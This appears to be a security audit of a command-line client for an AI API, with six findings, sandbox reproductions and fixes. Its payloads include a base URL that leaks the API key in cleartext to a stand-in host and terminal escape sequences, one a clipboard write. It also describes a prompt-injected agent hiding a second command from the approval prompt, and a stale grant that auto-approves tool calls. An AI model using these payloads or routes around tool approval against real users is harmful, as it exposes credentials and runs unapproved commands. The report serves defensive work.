title: --base-url loopback gate accepts http://localhost:@remote-host, sending x-api-key in cleartext to a non-loopback host
description: The --base-url gate (ask-claude.sh:88-96) states that anything but https goes to a loopback address only, so the key never travels in clear over a network. It matches the raw string with shell case globs that accept any text after 'http://localhost:', 'http://127.0.0.1:' or 'http://[::1]:'. curl parses the text before an '@' in the authority as userinfo, so http://localhost:@evil.host passes the gate and curl connects to evil.host over plain HTTP. Every request that uses BASE_URL (messages at 251, Managed Agents calls at 381/384, the session stream at 401, file upload at 668, file download at 698) then carries ANTHROPIC_API_KEY in the x-api-key header, plus request bodies that can carry the MCP token and GITHUB_TOKEN, to that remote host and to any passive observer on the path.
root_cause: ask-claude.sh:94 validates the base URL by glob prefix on the raw string (http://localhost[:/]*, http://127.0.0.1[:/]*, http://\[::1\][:/]*) instead of by the parsed authority. The ':' alternative admits RFC 3986 userinfo, so the gate and curl disagree on the host when the URL contains '@'. No later host check exists before curl.
intended_behavior: An http:// base URL is accepted only when the host curl connects to is a loopback literal (localhost, 127.0.0.1, [::1]) with an optional numeric port and optional path. Any base URL with userinfo ('@' in the authority) is refused.

trace.description: BASE_URL is set from --base-url (usage_base_url), a user-supplied CLI flag or environment value.
The glob http://localhost[:/]* (and the 127.0.0.1 and [::1] forms) matches http://localhost:@evil.host; nothing checks the text after ':'.
API is set to ${BASE_URL%/}/v1/messages; the authority is unchanged.
The header block printed to a pipe contains x-api-key: $ANTHROPIC_API_KEY.
curl sends POST $API with the key header; curl connects to the host after '@' over plain HTTP. The same BASE_URL reaches curl at lines 381, 384, 401, 668 and 698.

evidence.description: The comment states the invariant: anything but https goes to a loopback address only, so the key never travels in clear over a network.
Prefix glob gate; the ':' separator allowed after the loopback literal admits userinfo.
-H @<(headers "$betas") attaches x-api-key to the request sent to whatever host curl parses from $API.

conditions.description: The user, or a .env, alias, wrapper or copied instruction the user runs, supplies --base-url of the form http://<loopback-literal>:<anything>@<remote-host>. The value is user-supplied; the gate exists to stop exactly this cleartext case.
The key reaches the named remote host and any passive observer on the network path, because the transport is plain HTTP.

execution.attacker_perspective: An on-path network observer, or the operator of the host named after '@', who benefits when a user runs ask-claude with a loopback-looking base URL that the gate approves.
instructions: In an offline sandbox, run: env -i PATH=/usr/bin:/bin HOME=<empty dir> XDG_STATE_HOME=<scratch dir> ANTHROPIC_API_KEY=sk-ant-test-not-a-key usage_model=m usage_max_tokens=16000 usage_prompt=ping usage_base_url='<payload>' bash ask-claude.sh </dev/null
Controls: usage_base_url=http://evil.invalid, http://localhost.evil.invalid and http://127.0.0.1.evil.invalid must exit 2 with the gate message.

To observe the request bytes, write 'connect-to = evil.invalid:80:127.0.0.1:8099' to HOME/.curlrc (reroutes only the TCP connect; the URL and Host stay evil.invalid) and run a loopback listener on 127.0.0.1:8099 that records the request head.
execution.observed_result: All three controls exited 2 with the gate message. All four payloads passed the gate; curl exited with 'Could not resolve host: evil.invalid' and the script exited 1. With the connect-to reroute, the loopback listener received plaintext 'POST /v1/messages HTTP/1.1', 'Host: evil.invalid', 'Authorization: Basic bG9jYWxob3N0Og==' (userinfo 'localhost:') and 'x-api-key: sk-ant-test-not-a-key' for http://localhost:@evil.invalid, and the same with 'Authorization: Basic Wzo6MV06eA==' for http://[::1]:x@evil.invalid.

remediation.strategy: Decide on the parsed authority, not a string prefix. Refuse any base URL that contains '@' (this also refuses '@' in a path, which the API root never needs). Accept http only when the whole URL matches http://(localhost|127.0.0.1|[::1]) with an optional all-digit port and an optional '/'-path. Add regression cases for http://localhost:@x, http://127.0.0.1:1@x, http://[::1]:x@x and http://localhost:8080@x/. The fix enforces the stated invariant at the only point BASE_URL is validated; it does not move trust elsewhere.

likelihood.reason: The value comes from the invoking user. Exploitation needs the user to adopt a crafted loopback-looking URL with an embedded '@'. A user can already send the key to any https host by design, so the marginal risk is the cleartext transport and the false assurance of the documented gate.

impact.reason: Disclosure of ANTHROPIC_API_KEY (and request bodies that can carry the MCP token and GITHUB_TOKEN) in cleartext to a remote host and to the network path, which is the property the gate claims to guarantee. Demonstrated locally with a dummy key.

confidence.reason: Independently reproduced by v01: the real script ran in the parent-approved offline sandbox, the gate accepted all four payloads and refused three controls, and a loopback listener captured the plaintext x-api-key header with Host: evil.invalid. The proposed fix was exercised against the same inputs.

title: -f file contents and interactive chat lines are passed on jq's command line, contrary to the script's secrets-off-argv design
description: The transport keeps the API key and the request body off curl's command line because 'other local accounts can read' it (ask-claude.sh:240-241). The private text that becomes the body is still placed on jq's argv when the request is built: the full contents of the one-shot -f file (ask-claude.sh:853 -> 857 -> 335), every line typed in the chat loop (208 -> 224 -> 335), the first agent chat line (648 -> 569) and every later agent chat line (651). None of this text was on the user's own command line. On hosts where other accounts can read process arguments (Linux /proc/<pid>/cmdline without hidepid), another local account that polls the process table can capture it while each short-lived jq process runs. Credentials are not affected: the key reaches curl through a /dev/fd pipe and the MCP and GitHub tokens are read inside jq through env.
root_cause: ask() (ask-claude.sh:335), session_create() (ask-claude.sh:569) and session_loop() (ask-claude.sh:651) pass user-supplied request text to jq with --arg instead of through stdin, a private file, or the environment, which is the channel the script already uses for GITHUB_TOKEN and ASK_CLAUDE_MCP_TOKEN.
intended_behavior: Text that did not come from the user's own command line (-f file contents, chat-loop lines, agent chat lines) reaches jq only through stdin, a 0600 file in the private state dir, or the environment, so no child argv carries private request text.

trace.description: prefix is set to the full contents of the -f file via $(cat "$usage_file"); only the filename is on the user's argv.
ask "$prefix$usage_prompt" passes the file contents plus prompt as $1.

jq --arg c "$1" places the whole user turn on jq's argv. Chat-loop lines read at line 208 reach this sink via ask "$line" at line 224; agent chat lines reach equivalent sinks at line 569 (--arg prompt, via session_create "$line" at 648) and line 651 (--arg t).

evidence.description: Design comment: neither the key nor the body goes on curl's command line, which other local accounts can read.
Comment: history holds -f file contents and everything the script creates is private to the user (umask 077 at line 61).
jq --arg c "$1" with the user turn text.
--arg prompt "$1" in session_create, which receives the first agent chat line from line 648.
jq -n -c --arg t "$line" for later agent chat lines.

conditions.description: A multi-user host where another account can read other users' process arguments, such as Linux /proc/<pid>/cmdline with the default hidepid=0. Not observed cross-account in this audit (the sandbox is single-user); macOS behaviour is unverified.
The observer must sample the process table while a short-lived jq process runs, once per turn; a tight polling loop makes this practical.
The victim uses -f with private content, or types private text in the chat loop or the agent chat loop.

execution.attacker_perspective: Another unprivileged local account on the same host that reads other processes' argv.
payloads: printf 'FILE-CONTENT-CANARY-v02a\n' > private-notes.txt; usage_file=private-notes.txt usage_prompt=summarise bash ask-claude.sh

printf 'AGENT-FIRST-CANARY-v02c
AGENT-NEXT-CANARY-v02d
/quit
' | usage_cmd=agent usage_agent=agent_x usage_environment=env_x usage_budget=0 bash ask-claude.sh
instructions: In the parent-approved sandbox, put argv-recording shims for jq and curl first on PATH; each appends its argv to a scratch log and execs the real binary.

Run the one-shot with -f and the chat loop under ASK_CLAUDE_REPLAY=<message SSE fixture>, the agent chat loop under ASK_CLAUDE_REPLAY=<directory>, and one live one-shot with usage_base_url=http://127.0.0.1:9 (nothing listens), all with dummy secrets ANTHROPIC_API_KEY=sk-ant-APIKEY-CANARY-v02, ASK_CLAUDE_MCP_TOKEN=MCPTOKEN-CANARY-v02, GITHUB_TOKEN=ghp_GHTOKEN-CANARY-v02.
Count each canary in the jq and curl argv logs.
execution.observed_result: jq argv contained FILE-CONTENT-CANARY-v02a 2 times (replay one-shot and live one-shot, as 'jq [--arg] [c] [FILE-CONTENT-CANARY-v02a ...'), CHAT-LINE-CANARY-v02b 1 time, AGENT-FIRST-CANARY-v02c 1 time (as '--arg prompt' with -f /target/lib/session-create.jq) and AGENT-NEXT-CANARY-v02d 1 time (as '--arg t'). The API key, MCP token and GitHub token canaries appeared 0 times in jq argv and 0 times in curl argv. Live curl argv was '-sS -N --max-time 1800 http://127.0.0.1:9/v1/messages -H @/dev/fd/63 --data-binary @-'. Cross-account readability of argv was not exercised.

remediation.strategy: Pass user request text to jq through stdin or the environment, as the script already does for tokens; keep only filenames and non-private fixed values on argv. Add a regression test that runs the one-shot -f path, the chat loop and the agent loop with an argv-recording jq shim and asserts that no prompt or file canary appears in any child argv.

likelihood.reason: Requires a second local account on a host that exposes other users' argv, sampling during a millisecond-scale jq run per turn. Single-user laptops and containers are not affected.

impact.reason: Disclosure of -f file contents and conversation text that the script explicitly treats as private (umask 077, mode-700 state dir, secrets-off-argv design). Credentials are not exposed.

confidence.reason: Source path verified line by line and reproduced independently with argv-recording shims on the real script. Cross-account readability of argv is an OS configuration property stated as a condition, not observed here.

title: Managed Agents tool names, stop reasons, event ids, session ids and raw stream bytes reach the terminal without the `safe` filter
description: The script states that API text must not drive the terminal (ask-claude.sh:122-125) and applies `safe` in every lib/*.jq render program and in most shell-side jq calls. Several Managed Agents values that the shell extracts itself bypass that filter: the tool name and string-typed tool input in the confirmation prompt (443, to /dev/tty) and its status lines (439, 463, 464), stop_reason (518 -> 551), stop_reason.event_ids (521), the session id returned by POST /sessions (571 -> 550, 655; it is also persisted as a sessions/ file name by session_remember at 584 and later echoed by `agent archive`/`trace`/`resume` at 732/809/820), and the first 200 raw bytes of a non-SSE stream body (503). An API endpoint that puts ESC/BEL/OSC/CSI sequences in these fields writes them to the user's terminal: window-title changes, line/screen erasure (including rewriting the displayed 'allow NAME INPUT? [y/N/a]' confirmation text), and OSC 52 clipboard writes on terminals that honour OSC 52.
root_cause: The shell extracts these fields with plain `jq -r` (466 `@tsv`, 518, 521, 571) or `head -c` (503), with no SAFE prefix and no shape check, and interpolates them into echo / read -p strings. `jq -r` decodes \u001b to a raw 0x1b byte; `@tsv` escapes only TAB, CR, LF and backslash; `.input | tostring` returns a string input unchanged, so only object inputs are JSON-escaped. lib/session-fold.jq:17-22 copies stop_reason.type, event_ids and tool_use name/input through unmodified.
intended_behavior: Every byte that comes from the API and is written to stdout, stderr or /dev/tty passes through `safe` (or an equivalent C0/C1 strip). Identifiers used for display, file names and URL paths are additionally checked against their expected shape (e.g. a session id matches ^sesn_[A-Za-z0-9_]+$) before use.

trace.description: The SSE stream from $BASE_URL/v1/sessions/<id>/events/stream (API-controlled) is written verbatim to the log file; in replay mode line 398 copies the fixture instead.
stop_reason is taken from $idle.stop_reason.type, event_ids (line 17/20) and asks[].{id,name,input} (line 21) are copied from the events without sanitising.
`jq -r '.asks[] | [.id, .name, (.input|tostring)] | @tsv'` emits raw ESC/BEL in name, and in input when input is a JSON string; the values become $name/$input at line 460.
`stop=$(jq -r '.stop_reason // ""')` with no SAFE prefix.
`sesn=$(jq -r '.id // empty')` accepts any string as the session id; it is returned at 578 and used for display, the sessions/ file name (584) and URL paths.
`read -r -p "allow $1 $2? [y/N/a(lways)] " </dev/tty` prints the raw tool name and input as the approval prompt (source-verified; no TTY in the sandbox).

evidence.description: SAFE is defined because 'Replies and error messages may carry control characters; jq -r decodes \u001b etc. into raw bytes' (comment 122-124). This is the stated invariant the sinks violate.
@tsv without safe feeds name and input to session_confirm (443/439) and to the allowed/denied status lines (463/464).
`jq -r '.event_ids | join(" ")'` interpolated into stderr without safe.
`head -c 200 "$log.err" "$log" | tr -d '\n'` prints raw server bytes to stderr.

Sibling control: the usage line passes the same $sesn through `--arg s ... | safe`; in v03's run it printed '[sesn_]0;V03-T5 ...' with ESC/BEL stripped while 550 and 655 printed them raw. The inconsistency shows the omission is unintended.

session_remember writes $SESSIONS/$sesn; v03 observed a file named 'sesn_<ESC>]0;V03-T5<BEL>' created, which session_find (591 filters only '/' and glob characters) would later return to the echo sinks at 732/809/820.
Comparable control: the live renderer strips control characters from the same tool name ('(bash[2K[1Gread_file)' in v03's run), so only the shell-side extractions are unsanitised.
Sibling sink (observed locally): `echo "ask-claude: allowed $name ($input)" >&2` (and 439 for deny, 464 for ASK_CLAUDE_CONFIRM=deny) print the raw tool name/input to stderr; observed locally.
Sibling sink (observed locally): `echo "[stopped: $stop]" >&2` prints the raw stop_reason; observed locally.
Sibling sink (observed locally): event_ids joined with plain jq -r are interpolated into stderr; observed locally.
Sibling sink (observed locally): `head -c 200 "$log.err" "$log" | tr -d '\n'` prints raw server bytes to stderr when the stream has no data: lines; observed locally.
Sibling sink (observed locally): `resume with: ask-claude agent resume $sesn` (and 550 budget_reached hint) print the API-supplied session id raw; observed locally.

conditions.description: The attacker controls Managed Agents API responses: the https host the user named with --base-url, or the API provider itself (or a compromise of either). Built-in tool names, stop_reason, event_ids and session ids are server-assigned, and object tool inputs are JSON-escaped by tostring, so model output alone is not shown to reach these fields.
The user runs `ask-claude agent ...` (one-shot, chat loop, or resume) against that endpoint.
The concrete terminal effect (title set, line erase, prompt rewrite, OSC 52 clipboard write) depends on the user's terminal emulator. The raw bytes reach stderr / /dev/tty unconditionally.

execution.attacker_perspective: A malicious or compromised Managed Agents endpoint returns session events and a POST /sessions response whose server-assigned string fields contain terminal control sequences.
payloads: turn 1 SSE: data: {"type":"agent.tool_use","id":"evt_1","name":"bash\u001b[2K\u001b[1Gread_file","input":"\u001b]0;V03-TITLE\u0007ls"} followed by data: {"type":"session.status_idle","stop_reason":{"type":"requires_action","event_ids":["evt_1"]}}
non-SSE stream body: oops ESC]0;V03-T2 BEL ESC[2J
instructions: In the parent sandbox (no network, read-only target at /target, dummy key sk-ant-test-not-a-key, XDG_STATE_HOME=/scratch/state), run `bash /target/ask-claude.sh` with usage_cmd=agent usage_prompt=hi usage_agent=agent_x usage_environment=env_x usage_budget=0 usage_model=m usage_max_tokens=16000 and ASK_CLAUDE_REPLAY pointing at a directory with the turn 1/turn 2 fixtures as 1.sse/2.sse; once with ASK_CLAUDE_CONFIRM=allow and once unset with stdin </dev/null.
Repeat with a directory whose 1.sse holds the event_ids payload, and with one whose 1.sse holds the non-SSE body.

For the session id: source `head -n 772 /target/ask-claude.sh`, set LIB=/target/lib, override ma_call so 'POST /sessions' returns the payload id, use a 1.sse with stop_reason budget_reached, and feed one line to session_loop.
Pipe all output through `cat -v` so raw 0x1b shows as ^[ and BEL as ^G (script: agents/v03/artifacts/run.sh).
execution.observed_result: stderr carried raw control bytes: 'ask-claude: allowed bash^[[2K^[[1Gread_file (^[]0;V03-TITLE^Gls)', 'ask-claude: denied bash^[[2K^[[1Gread_file (^[]0;V03-TITLE^Gls): stdin is not a terminal ...', '[stopped: ^[]52;c;cHduZWQ=^Gend_turn]', '(evt_^[]0;V03-T3^G); interrupting', 'no response from the stream (==> ... <==oops ^[]0;V03-T2^G ^[[2J)', '[stopped: budget_reached, raise it with: ask-claude agent budget sesn_^[]0;V03-T5^G <cents>]', 'resume with: ask-claude agent resume sesn_^[]0;V03-T5^G'. In the same runs the safe-filtered paths (lib/session.jq live render, usage line 537) printed the same values with ESC/BEL removed. A sessions/ file named 'sesn_^[]0;V03-T5^G' was created. Line 443 (/dev/tty) was not exercised (no TTY); it interpolates the identical $1/$2 values.

remediation.strategy: Sanitise at extraction time: apply SAFE to every display-only field the shell pulls out with jq, keep exact values only where they are sent back to the API, and validate identifiers that are also used in file names and URL paths (session id) against their expected shape at the point they enter (571). Strip C0 and C1 control bytes from raw diagnostic dumps. This enforces the existing invariant at the boundary rather than moving trust; the lib/*.jq renderers already hold.

code_changes.fixed_code:
# 466: display copies sanitised; id kept exact for the answer event
done < <(jq -r "$SAFE"'.asks[] | [.id, (.name // "?" | tostring | safe), (.input | tostring | safe)] | @tsv' <<<"$fold")
# 518
stop=$(jq -r "$SAFE"'.stop_reason // "" | tostring | safe' <<<"$fold")
# 521
... ($(jq -r "$SAFE"'.event_ids | map(tostring) | join(" ") | safe' <<<"$fold")) ...
# 503: strip C0, DEL and C1 bytes from the raw dump
... ($(head -c 200 "$log.err" "$log" 2>/dev/null | LC_ALL=C tr -d '\000-\037\177-\237' | cut -c1-200)) ...
# 571-572: session_create
sesn=$(jq -r '.id // empty' <<<"$resp" 2>/dev/null)
[[ $sesn =~ ^sesn_[A-Za-z0-9_]+$ ]] || sesn=""

likelihood.reason: Requires the Managed Agents endpoint itself to be hostile or compromised: the provider, or an https host the user chose with --base-url. Model output and web/MCP content are not shown to reach these server-assigned or JSON-escaped fields.

impact.reason: Demonstrated: arbitrary escape sequences on the user's stderr (title set, line/screen erase, OSC 52 clipboard payload) and, from source, in the /dev/tty confirmation prompt, so a hostile endpoint can make the displayed prompt text differ from the tool name. A hostile endpoint already runs the agent's tools server-side, so prompt spoofing grants no extra tool authority; local code execution would need a further user paste and was not shown.

confidence.reason: Independently reproduced by v03 in the parent sandbox for sinks 439, 463, 551, 521, 503, 550 and 655, with safe-filtered sibling paths stripping the same bytes in the same runs. Line 443 shares the identical variables and was verified from source only. Sandbox jq is 1.7 vs pinned 1.8.2; jq -r decoding of \u001b and @tsv escaping are the same in both.

title: Tool-confirmation prompt double-escapes tool input, misrepresenting the approved command
description: session_answer renders each pending agent.tool_use input as (.input | tostring) and then passes the row through @tsv, which escapes every backslash a second time; read -r keeps the doubled backslash and session_confirm prints it verbatim. A real newline inside input.command (two shell commands, 'echo safe' NL 'id') is shown as {"command":"echo safe\\nid"}, which is byte-identical to the correct single-encoded JSON of a different input: one echo command containing a literal backslash-n. The user's y answer is bound to the tool_use_id, so it approves the server-held two-command input, not the one the prompt depicts. Model output steerable by injected web/tool content can choose such input.
root_cause: Double encoding at ask-claude.sh:466: jq -r '.asks[] | [.id, .name, (.input | tostring)] | @tsv'. The input is JSON-encoded once by tostring and its backslashes are escaped again by @tsv; nothing on the read side (ask-claude.sh:460, IFS=$'\t' read -r) decodes the @tsv layer, so session_confirm (ask-claude.sh:443) and the allowed/denied log lines (ask-claude.sh:463-464) show a JSON text that decodes to a different object than the one approved.
intended_behavior: The confirmation prompt must render the exact input object being approved, encoded exactly once (valid JSON whose decoding equals the server-held input), so separators such as newlines are visible as what they are, while control bytes stay escaped.

trace.description: agent.tool_use events from the Managed Agents session stream (model-controlled name and input) whose id is in the requires_action idle event_ids are copied into .asks as {id, name, input}.
jq -r '.asks[] | [.id, .name, (.input | tostring)] | @tsv': tostring turns a newline into backslash-n, then @tsv turns that backslash into two backslashes.
while IFS=$'\t' read -r id name input: -r keeps the doubled backslash; no @tsv unescaping is applied.
read -r -p "allow $1 $2? [y/N/a(lways)] " shows the double-escaped input; the answer returned to session_answer is sent as user.tool_confirmation for the real tool_use_id (ask-claude.sh:465).

evidence.description: jq -r '.asks[] | [.id, .name, (.input | tostring)] | @tsv' <<<"$fold" (tostring followed by @tsv).
Prompt prints $2 (the input field) exactly as read.
Answer appended as {type: user.tool_confirmation, tool_use_id: $id, result: $r}: bound to the server-held input, not to the displayed text.
The streaming renderer prints only "(<name>) " for agent.tool_use, so the confirmation prompt is the only place the input is shown to the user before approval.

conditions.description: The user runs the agent subcommand interactively on a TTY without ASK_CLAUDE_CONFIRM and answers y or a at the prompt, relying on the displayed input.

The agent model (steerable by prompt-injected content it reads) emits an agent.tool_use for an always_ask tool whose string input contains a newline, e.g. a bash command with a second command after a newline.

execution.attacker_perspective: Content the agent reads (web page, file, tool output) prompt-injects the model into proposing a bash tool call whose command hides a second command behind a real newline, so the prompt depicts one harmless-looking command.
payloads: fx/nl/1.sse: data: {"type":"agent.tool_use","id":"sevt_V1","name":"bash","input":{"command":"echo safe\nid"}} followed by data: {"type":"session.status_idle","stop_reason":{"type":"requires_action","event_ids":["sevt_V1"]}}
fx/lit/1.sse (control): same with input {"command":"echo safe\\nid"} (literal backslash-n, one command) and id sevt_V2
instructions: In the network-less sandbox (sandbox-run.sh, jq 1.7, bash 5.2), write the two SSE fixtures under /scratch/fx/{nl,lit}/1.sse.

Run: XDG_STATE_HOME=/scratch/st usage_cmd=agent usage_prompt=ping usage_model=m usage_max_tokens=16000 usage_agent=agent_X usage_environment=env_X usage_budget=0 ANTHROPIC_API_KEY=sk-ant-test-not-a-key ASK_CLAUDE_REPLAY=/scratch/fx/nl ASK_CLAUDE_REQUEST_LOG=/scratch/req.jsonl bash -c "printf 'y\n' | script -qec 'bash /target/ask-claude.sh' /scratch/ts.txt"
Compare the 'allow bash' line in the typescript with od -c of the fixture's input.command, and read the user.tool_confirmation in the request log. Repeat with the lit fixture as a control.
execution.observed_result: Real-newline input (bytes 'echo safe' NL 'id') is prompted as: allow bash {"command":"echo safe\\nid"}? and allow is sent for sevt_V1. The control input with a literal backslash-n is prompted as {"command":"echo safe\\\\nid"}. The prompt for the two-command input is therefore byte-identical to what a correct single encoding would show for the one-command literal-backslash-n input. Replacing the @tsv row with per-ask jq -c .input renders {"command":"echo safe\nid"} and {"command":"echo safe\\nid"} respectively (correct single encoding).

remediation.strategy: Encode the input exactly once and do not pass JSON text through @tsv. Iterate the asks as compact JSON lines (jq -c '.asks[]', one line per ask because JSON escapes newlines) and extract id, name and input per ask, with input rendered by jq -c (tojson). This keeps C0 bytes \u-escaped and newlines visible as a single \n escape. Apply the same rendering to the allowed/denied log lines (ask-claude.sh:463-464). Optional hardening (separate issue): sanitise .name for the prompt with the same safe filter used in lib/session.jq. Regression test: a fixture whose input.command contains a real newline must render exactly {"command":"echo safe\nid"}, and a literal backslash-n must render {"command":"echo safe\\nid"}. The hunter's base64 variant also works, but adds a base64 -d dependency whose flag differs on older macOS (-D).

code_changes.fixed_code:
while IFS= read -r ask; do
    id=$(jq -r '.id // empty' <<<"$ask")
    [ -n "$id" ] || continue
    name=$(jq -r '.name | tostring' <<<"$ask")
    input=$(jq -c '.input' <<<"$ask")
    result=$(session_confirm "$name" "$input")
    [ "$result" = allow ] && echo "ask-claude: allowed $name ($input)" >&2
    [ "$result" = deny ] && [ -n "${ASK_CLAUDE_CONFIRM:-}" ] && echo "ask-claude: denied $name ($input): ASK_CLAUDE_CONFIRM=$ASK_CLAUDE_CONFIRM" >&2
    answers=$(jq -c --arg id "$id" --arg r "$result" '. + [{type: "user.tool_confirmation", tool_use_id: $id, result: $r}]' <<<"$answers")
  done < <(jq -c '.asks[]' <<<"$fold")

likelihood.reason: Requires an injected model to propose a multi-line input for an always_ask tool, an interactive user who reads the shown value as JSON, and the trailing command text remains visible in the prompt, so a careful reader can still notice it.

impact.reason: The user approves a command whose structure (two commands vs one) differs from what the prompt depicts; execution happens in the remote session container under the user's API authority, not on the local machine. Demonstrated only up to the allow being sent for the real tool_use_id.

confidence.reason: Source trace verified line by line and the mismatch reproduced deterministically in the sandbox (jq 1.7; @tsv backslash escaping is the same in the pinned jq 1.8.2), with a control fixture showing the rendering collides with a different input's correct encoding. How far it misleads a given reader is reflected in the low likelihood, not the confidence.

title: Stale per-PID 'always' tool-confirmation grant file auto-approves agent tool calls in a later process
description: Answering 'a' at the Managed Agents tool-confirmation prompt creates $STATE/.always.<pid> (ask-claude.sh:447). Nothing ever deletes it. session_confirm treats the existence of $STATE/.always.$$ as a standing allow (ask-claude.sh:434), and this check runs before the no-terminal deny (ask-claude.sh:438). A later `ask-claude agent` or `agent resume` process that receives the same PID therefore sends result=allow for every agent.tool_use confirmation without prompting, including unattended runs whose default is deny. PID reuse happens through PID wraparound on a host, where the risk grows as grant files accumulate, and deterministically in containers or devcontainers that launch the same way and share the state dir. The approved tool calls are chosen by the model, which prompt-injected web, repo or file content can steer. They run in the remote session container with the session's resources (mounted GitHub repo, vaults, memory stores), and the user never approved them.
root_cause: The 'always' grant is meant to last for one process, but it is persisted in a file keyed only by $$ (ask-claude.sh:447) and has no removal path. There is no EXIT trap, session_cleanup (ask-claude.sh:556-561) removes only the stream log and its .err, and session_prereqs (ask-claude.sh:745-770) does not clear a stale file at startup. The check at ask-claude.sh:434 accepts any existing file with that name, with no binding to process start time or lifetime, and runs before the TTY/deny logic at ask-claude.sh:438.
intended_behavior: The comment at ask-claude.sh:422-425 and the prompt text say that 'always' applies for the rest of the process that received it. A new process must start with no grant. It must ask at a terminal, or deny when there is no terminal, unless ASK_CLAUDE_CONFIRM says otherwise.

trace.description: An earlier process: the user answers 'a' at the prompt read from /dev/tty.
The grant is persisted as : >"$STATE/.always.$$" and never removed afterwards.
A later process calls session_confirm for each agent.tool_use ask in the fold of a model- or API-supplied stream. $$ in this command-substitution subshell is the parent script's PID.
If .always.$$ exists (left by an earlier process with the same PID), the function returns allow before the no-TTY deny at :438.
user.tool_confirmation with result=allow is POSTed to /sessions/<id>/events, and the server runs the tool.

evidence.description: The comment says the always answer is kept in a file because session_confirm runs in a subshell. The intent is 'for the rest of this process' (:423).
The grant check tests only that the file exists. It is keyed by $$ and has no ownership, age or process-lifetime binding. It precedes the no-TTY deny at :438.
The grant file is created here. `rg '\.always'` over the repository finds only :434 and :447, so no code removes it.
session_cleanup removes only the stream log and its .err, and resets only the INT trap (:560). The script sets no EXIT trap.
session_prereqs runs before every `agent` and `agent resume` request (:775, :819) and clears no stale grant.

conditions.description: In some earlier ask-claude agent process, the user answered 'a' at a tool confirmation, which left $STATE/.always.<pid>.

A later ask-claude agent process gets the same PID. On a host this happens through PID wraparound, and the probability grows with the number of leftover files. In a container or devcontainer that shares the state dir and launches the same way, it is deterministic: v05 saw the same PID across separate containers.
The agent's tools use an always_ask permission policy, so agent.tool_use confirmations reach the client. ASK_CLAUDE_CONFIRM is unset or 'ask'.

execution.attacker_perspective: Model output proposes a tool call that the user never approved. Prompt-injected web, repo or file content can steer that output. The stale grant from an unrelated earlier process approves the call.
payloads: fx/grant/1.sse: data: {"type":"agent.tool_use","id":"sevt_T1","name":"bash","input":{"command":"echo pong"}} followed by data: {"type":"session.status_idle","stop_reason":{"type":"requires_action","event_ids":["sevt_T1"]}}; fx/grant/2.sse: an agent.message 'pong' followed by session.status_idle end_turn
instructions: Run each step in a network-less sandbox with XDG_STATE_HOME=<state dir>, ASK_CLAUDE_REPLAY=/scratch/fx/grant, a dummy ANTHROPIC_API_KEY, usage_cmd=agent, usage_prompt=ping, usage_agent=agent_X, usage_environment=env_X, usage_budget=0 and ASK_CLAUDE_REQUEST_LOG set. ASK_CLAUDE_CONFIRM is unset.

Process A, in container 1 with a fresh state dir: run `printf 'a\n' | script -qec 'bash /target/ask-claude.sh' /dev/null`. Expected: the prompt appears, the answer is 'a', and .always.<pid> remains in the state dir after exit.
Process B, in a new container with the same state dir and the same launch command but empty stdin, so no answer is typed: inspect the second line of the request log.
Control: repeat process B with a fresh state dir. Expected: the prompt appears and result=deny is sent.

Unattended ordering: with no pty, stdin /dev/null and a .always.<pid> matching the PID the script gets (via `bash -c ': >"$STATE/.always.$$"; exec bash /target/ask-claude.sh'`), inspect the confirmation sent.
execution.observed_result: Process A (PID 15) left .always.15 after exit. Process B, a new process in a new container with the same PID 15 and nothing typed, printed no prompt. It logged 'ask-claude: allowed bash ({"command":"echo pong"})' and sent {"events":[{"type":"user.tool_confirmation","tool_use_id":"sevt_T1","result":"allow"}]}. The fresh-state-dir control printed the prompt and sent result=deny. Runs whose PID differed from 15 sent deny. With no terminal and a matching stale grant (PID 13), the script sent result=allow instead of the default no-TTY deny.

remediation.strategy: Bind the grant to the live process. In session_prereqs, which runs before every `agent` and `agent resume` request, compute ALWAYS="$STATE/.always.$$", remove any stale file at that path, and install an EXIT trap that removes it. session_confirm then checks and creates "$ALWAYS". The startup rm enforces the invariant even when the earlier process was SIGKILLed and its EXIT trap never ran. The EXIT trap only keeps files from accumulating. session_cleanup resets only the INT trap, so it does not clobber the EXIT trap. A file is still needed because session_confirm runs in a command-substitution subshell and cannot set parent variables. Regression test: create $STATE/.always.<pid> for the PID the script will get (exec chain), run the confirm fixture off a terminal, and assert result=deny.

code_changes.fixed_code:
# end of session_prereqs, before need_key returns:
ALWAYS="$STATE/.always.$$"
rm -f "$ALWAYS"
trap 'rm -f "$ALWAYS"' EXIT

# session_confirm:
  if [ -e "$ALWAYS" ]; then
    echo allow
    return
  fi
  ...
  a | A | always)
    : >"$ALWAYS"
    echo allow
    ;;

likelihood.reason: The user must first have answered 'always' in some process, and a later agent process must then get the same PID. On a host that is a probabilistic wraparound collision, and leftover files accumulate. It is deterministic only in containers that launch the same way and share a persistent state dir. The agent must also use always_ask tool policies.

impact.reason: Model-chosen tool calls (bash, file writes, fetches) that the user never approved run in the remote session container, with the session's mounted repo credentials, vaults and memory stores. The no-terminal default deny is overridden. Nothing runs on the local machine.

confidence.reason: Source shows no removal path. v05 independently reproduced the result across two separate sandbox containers, with a negative control (fresh state dir gives deny) and a PID-mismatch control (gives deny). v05 also observed that a matching stale grant overrides the no-terminal deny.

title: agent files download writes through a pre-existing <name>.part symlink, bypassing no-clobber
description: session_files (ask-claude.sh:680-707) refuses to download when $name already exists (693), but it writes the bytes to $name.part, through a shell redirect in replay mode (697) or curl -o in live mode (698). Neither write is exclusive and both follow an existing symlink. mv (703) then renames the symlink itself onto $name. A party that can place <name>.part as a symlink in the directory where the user runs `ask-claude agent files <sesn> <name>` therefore redirects the session file's bytes into any path the user can write. If the symlink dangles, the write creates a new file at that path. Examples of such a party: a cloned repository that commits the symlink, or another account in a shared directory. Linux fs.protected_symlinks covers only sticky world-writable directories, and macOS has no equivalent. The bytes are the session file's content, which the agent produces and which the API endpoint serves, so the prompt, web content or a hostile endpoint can choose them. Both write branches were reproduced locally.
root_cause: The temporary path $name.part is opened by name with O_CREAT|O_TRUNC and without O_EXCL or O_NOFOLLOW (bash `>` at 697, curl -o at 698), and the no-clobber check at 693 tests only $name. The path that is actually written is therefore never checked and follows an attacker-placed symlink.
intended_behavior: A download lands only in a newly created regular file in the cwd. A pre-existing $name.part of any type has no effect on where the bytes go. An existing $name is refused unless --force, and --force never writes through a symlink or into a non-regular file.

trace.description: ma_call GET /files?scope_id=<sesn>: the API (lower trust) returns the file listing whose id selects the bytes to download; the user-typed name must match a listed filename (691)
The name filter rejects '/', empty, leading '.' and leading '-'. It keeps the name inside the cwd lexically but does not inspect what already exists there
The no-clobber check tests -e "$name" only; $name.part is not checked
Replay branch: cat ... >"$name.part" opens the existing symlink and truncates and writes its target
